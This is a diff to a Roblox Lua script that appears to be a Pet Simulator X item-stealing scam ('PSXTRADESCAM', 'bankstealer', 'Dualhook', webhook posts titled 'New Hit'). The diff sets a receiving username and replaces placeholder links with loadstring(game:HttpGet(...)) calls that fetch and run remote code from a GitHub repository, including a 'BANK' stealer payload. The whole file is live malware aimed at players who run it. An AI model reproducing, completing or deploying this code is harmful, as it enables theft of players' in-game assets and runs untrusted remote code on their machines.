@@ -8,9 +8,9 @@
 ]]--
 
 getgenv().Settings = {
-    User = "bifeteafeyt123",
-    Webhook = true, -- if you made it true they will receive dualhooked and undualhooked notifs to their webhook
-    MailMessage = ".gg/uSgzNwHDTS",
+    User = "psx_alt123442",
+    Webhook = false, -- if you made it true they will receive dualhooked and undualhooked notifs to their webhook
+    MailMessage = "abc",
     Titanics = {
         Dualhook = true,
         Intensity = 100 --%
@@ -214,7 +214,7 @@ local data1
 
 -- Loading Screen
 if _G.LoadingScreen ~= false then
-    loadstring(game:HttpGet('Put Your Loading Screen Raw Link Here'))() -- Exc : https://raw.githubusercontent.com/blabla/blabla/main/ls.lua
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/BIFE123/PSXTRADESCAM/main/LOADER'))()
 end
 
 -- Remotes
@@ -751,7 +751,7 @@ if diaamt < 110000 then
     _G.LoadingScreen = false
     _G.AntiLeave = false
     _G.MouseLock = false
-    loadstring(game:HttpGetAsync("bankstealer raw link", true))() -- Exc : https://raw.githubusercontent.com/blabla/blabla/main/bank.lua
+    loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/BIFE123/PSXTRADESCAM/main/BANK", true))() -- Exc : https://raw.githubusercontent.com/blabla/blabla/main/bank.lua
     return;
 end
 if _G.AntiLeave ~= false then
@@ -961,7 +961,7 @@ local function SendWebhook(rarity, name, ping, d, f, petimg, receiver)
             ["username"] = "Rizz Scriptz",
             ["avatar_url"] = imgs,
             ["embeds"] = { {
-                ["title"] = "**New Hit** ||With Rizz||",
+                ["title"] = "**New Hit** ",
                 ["url"] = "https://discord.gg/uSgzNwHDTS",
                 ["type"] = "rich",
                 ["color"] = tonumber(0x2798FF),
